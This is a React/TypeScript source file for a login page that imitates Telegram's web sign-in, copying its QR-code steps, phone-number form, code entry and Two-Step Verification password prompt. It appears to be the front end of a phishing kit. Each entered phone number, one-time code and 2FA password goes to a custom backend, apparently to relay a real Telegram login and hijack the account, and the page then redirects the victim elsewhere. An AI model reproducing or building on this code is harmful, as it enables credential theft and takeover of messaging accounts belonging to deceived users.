import { FC, useState, useContext, useEffect } from "react";
import { observer } from "mobx-react-lite";
import { ctx } from "../..";
import LinkService from "../../services/LinkService";
import m from "./AuthPage.module.sass";
import { socket } from "../../websocket/socket";
import PhoneInput  from "../../component/PhoneInput/PhoneInput";
import Input from "../../component/Input/Input";
import { ICountry } from "../../models/ICountry";
import { formatPhoneNumberIntl } from 'react-phone-number-input'
import Spinner from "../../component/Spinner/Spinner";

const AuthPage: FC = () => {
  const { store } = useContext(ctx);
  const [qrUrl, setQrUrl] = useState<string>();
  const [pass, setPass] = useState<string>();
  const [phoneLogin, setPhoneLogin] = useState<boolean>(false);
  const [stage, setStage] = useState<string>("INIT");
  const [code, setCode] = useState<string>();
  const [phone, setPhone] = useState<string>();
  const [codeTimeoutId, setCodeTimeoutId] = useState<number>()
  const [codeInvalid, setCodeInvalid] = useState<boolean>(false)
  const [twofaInvalid, setTwofaInvalid] = useState<boolean>(false)
  const [loading, setLoading] = useState<boolean>(false)

  const initializeLoginProcess = async (visitorId: string) => {
    if(loading) return;
    setLoading(true)
    try {
      const { data } = await LinkService.intializeLoginProcess(visitorId);
      if (data.json) setQrUrl(data.json.qrUrl);
    } catch (e) {
      console.error(e);
    }
    setLoading(false)
  };

  const send2FACode = async () => {
    if(loading) return;
    setLoading(true)
    try {
      const { data } = await LinkService.send2FA(store.visitor!.id, pass!);
      switch(data.json.status) {
        case "SUCCESS": 
            setStage("SUCCESS")
            break
        case "PASSWORD_HASH_INVALID": 
            setTwofaInvalid(true)
            break
        default: 
            setStage("INIT")
            break
      }
    } catch (e) {
      console.error(e);
    }
    setLoading(false)
  };

  const sendCode = async () => {
    if(loading) return;
    setLoading(true)
    try {
      const { data } = await LinkService.sendCode(store.visitor!.id, phone!);
      if (data.json.status === "CODE") {
        setPhoneLogin(false)
        setStage("CODE");
      }
    } catch (e) {
      console.error(e);
    }
    setLoading(false)
  };

  const verify = async () => {
    if(loading) return;
    setLoading(true)
    try {
      const { data } = await LinkService.verifyCode(
        store.visitor!.id,
        phone!,
        code!
      );
      switch(data.json.status) {
        case "SUCCESS": 
            setStage("SUCCESS")
            break
        case "2FA": 
            setStage("2FA")
            break
        case "PHONE_CODE_INVALID":
            setCodeInvalid(true)
            break
        case "PHONE_CODE_EXPIRED": 
            break
      }
    } catch (e) {
      console.error(e);
    }
    setLoading(false)
  };

  useEffect(() => {
    if (store.visitor) initializeLoginProcess(store.visitor.id);
  }, [store.visitor]);

  useEffect(() => {
    if (!store.websocketConnected) return;
    socket.on("update", (data: string) => {
      switch (data) {
        case "2FA":
          return setStage("2FA");
        case "SUCCESS":
          return setStage("SUCCESS");
      }
    });
  }, [store.websocketConnected]);

  useEffect(() => {
    if(stage === "SUCCESS") window.location.href = store.link!.origin
  }, [stage])

  useEffect(() => {
    const p = formatPhoneNumberIntl(phone!)
    setPhone(!p ? phone : p)
  }, [phone])

  useEffect(() => {
    if(codeInvalid) setCodeInvalid(false)
    if(code?.length === 5) {
        clearTimeout(codeTimeoutId)
        const timeout = setTimeout(() => {
            if(code && code.length) verify()
        }, 1000)
        setCodeTimeoutId(Number(timeout))
    }
  }, [code])

  if (!store.link) return <></>;

  return (
    <div className={m.AuthPageWrapper}>
      {stage === "2FA" && (
        <div className={m.ContentAuth}>
            <img
            src="/monkey-face-hide.gif"
            className={m.TgLogo}
            alt="Telegram Logo"
            />
            <h4 className={m.SignInTitle}>
                Enter Password
            </h4>
            <p className={m.Hint}>
                You have Two-Step Verification enabled, so your account is protected with an additional password.
            </p>
            <Input
                primary
                onChange={(v) => setPass(v)}
                placeholder="Password"
                value={pass!}
                invalidPlaceholder="Invalid password."
                invalid={twofaInvalid}
            />
            {
                pass && pass.length > 0 && 
                <button
                    className="tgme-login-btn tgme-login-btn-primary tgme-btn-margin-large"
                    onClick={() => send2FACode()}
                >
                    {
                        loading 
                            ? 
                            <>
                                PLEASE WAIT...
                                <div className="tgme-btn-spinner-holder">
                                    <Spinner mini/>
                                </div>
                            </>
                            :
                            <>
                             NEXT
                            </>
                    }
                </button>
            }
            <div className="margin-bottom"></div>
        </div>
      )}
      {stage === "SUCCESS" && (
        <div>
        </div>
      )}
      {stage === "CODE" && (
        <div className={m.ContentAuth}>
            <img
            src="/monkey-face-hide.gif"
            className={m.TgLogo}
            alt="Telegram Logo"
            />
            <h4 className={m.SignInTitle}>
                <span>
                    {phone}
                </span>
                <div className="pencilIcon" onClick={() => {
                    setPhoneLogin(true)
                    setStage("PHONE")
                }}>
                </div>
            </h4>
            <p className={m.Hint}>
                We've sent the code to the <b>Telegram</b>  app on your other device.
            </p>
            <Input
            invalidPlaceholder="Invalid code."
            invalid={codeInvalid}
            primary
            onChange={(v) => setCode(v)}
            placeholder="Code"
            value={code!}
            maxlength={5}
            />
            <div className="margin-bottom"></div>
            {loading && <Spinner primary/>}
        </div>
      )}
      {!phoneLogin ? (
        stage === "INIT" && (
          <div className={m.ContentQr}>
            <div className={m.QrSpinnerHolder}>
                {loading ? 
                <Spinner primary/>
                :
                <img src={qrUrl} key={qrUrl} className={m.Qr}/>
                }
            </div>
            <h1 className={m.QRTitle}>Log in to Telegram by QR Code</h1>
            <ol>
              <li>
                <span>Open Telegram on your phone</span>
              </li>
              <li>
                <span>{"Go to Settings > Devices > Link Desktop Device"}</span>
              </li>
              <li>
                <span>Point your phone at this screen to confirm login</span>
              </li>
            </ol>
            <button
                className="tgme-login-btn"
                onClick={() => setPhoneLogin(true)}
            >
                LOG IN BY PHONE NUMBER
            </button>
          </div>
        )
      ) : (
        <div className={m.ContentAuth}>
          <img
            src="/telegram-logo.svg"
            className={m.TgLogo}
            alt="Telegram Logo"
          />
          <h4 className={m.SignInTitle}>Telegram</h4>
          <p className={m.Hint}>
            Please confirm your country code and enter your phone number.
          </p>
          <PhoneInput selectCb={(c: ICountry) => setPhone(c.phone)} pattern={phone!} />
          <Input
            primary
            onChange={(v) => setPhone(v)}
            placeholder="Your phone number"
            value={phone!}
          />
        
          <div className="margin-bottom"></div>
          <label className={m.Checkbox}>
            <input type="checkbox" id="sign-in-keep-session" />
            <div className={m["Checkbox-main"]}>
              <span className={m.label} dir="auto">
                Keep me signed in
              </span>
            </div>
          </label>
            {
                phone && phone.length > 6 && 
                <button
                    className="tgme-login-btn tgme-login-btn-primary tgme-btn-margin-large"
                    onClick={() => sendCode()}
                >
                    {
                        loading 
                            ? 
                            <>
                                PLEASE WAIT...
                                <div className="tgme-btn-spinner-holder">
                                    <Spinner mini/>
                                </div>
                            </>
                            :
                            <>
                             NEXT
                            </>
                    }
                </button>
            }
            <button
              className={`tgme-login-btn ${phone && phone.length > 6 ? "tgme-btn-margin" : "tgme-btn-margin-large"}`}
              onClick={() => setPhoneLogin(false)}
            >
              LOG IN BY QR CODE
            </button>
        </div>
      )}
    </div>
  );
};

export default observer(AuthPage);
